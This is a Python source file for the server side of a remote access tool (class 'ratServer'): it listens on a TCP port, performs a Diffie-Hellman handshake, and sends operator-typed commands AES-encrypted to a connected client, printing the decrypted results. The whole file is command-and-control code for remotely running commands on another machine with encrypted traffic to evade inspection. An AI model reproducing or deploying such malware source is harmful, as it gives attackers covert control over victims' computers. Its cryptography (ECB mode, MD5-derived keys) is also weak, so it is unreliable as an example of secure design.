from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
import pyDH
import chardet
from hashlib import md5
from socketserver import ThreadingMixIn, TCPServer, BaseRequestHandler


class ratServer(BaseRequestHandler):
    
    def handle(self):
        conn = self.request
        print(f'[*] Connection from {self.client_address[0]} {self.client_address[1]}')
        key = self._handShake(conn)
        print('[*] Handshake finished successfully, key exchanged.')
        print(f'key: {key}')
        while True:
            try:
                cmd = input('> ')
                cmd = self.encrypt(cmd, key)
                conn.sendall(cmd)
                
                res = b''
                LASTBLOCK = False
                
                while not LASTBLOCK:
                    data = conn.recv(16)
                    msgPad = b''
                    msgPad = self.decrypt(data, key)
                    try:
                        msgPad = unpad(msgPad, 16)
                        LASTBLOCK = True
                    except:
                        pass
                    finally:
                        res += msgPad
                encoding = chardet.detect(res).get("encoding") if chardet.detect(res).get("encoding") else 'GBK'
                res = res.decode(encoding=encoding,errors='backslashreplace')
                print(res)

            except Exception as err:
                print(err)
                break
            
        
    def _handShake(self, conn):
        DH = pyDH.DiffieHellman()
        DHSerPubKey = DH.gen_public_key()
        DHSerPubKey = DHSerPubKey.to_bytes(DHSerPubKey.bit_length(),'little')
        DHCliPubKey = int.from_bytes(conn.recv(2048), 'little')
        conn.sendall(DHSerPubKey)
        key = DH.gen_shared_key(DHCliPubKey)
        return md5(key.encode()).digest()

    def encrypt(self, msg, key):
        aesObj = AES.new(key, AES.MODE_ECB)
        msgPad = pad(msg.encode(), 16)
        encMsg = aesObj.encrypt(msgPad)
        return encMsg

    def decrypt(self, cipher, key):
        aesObj = AES.new(key, AES.MODE_ECB)
        msg = aesObj.decrypt(cipher)
        return msg


if __name__ == '__main__':
    with TCPServer(('127.0.0.1', 9011), ratServer) as server:
        print('[+] listening...')
        server.serve_forever()
        server.shutdown()
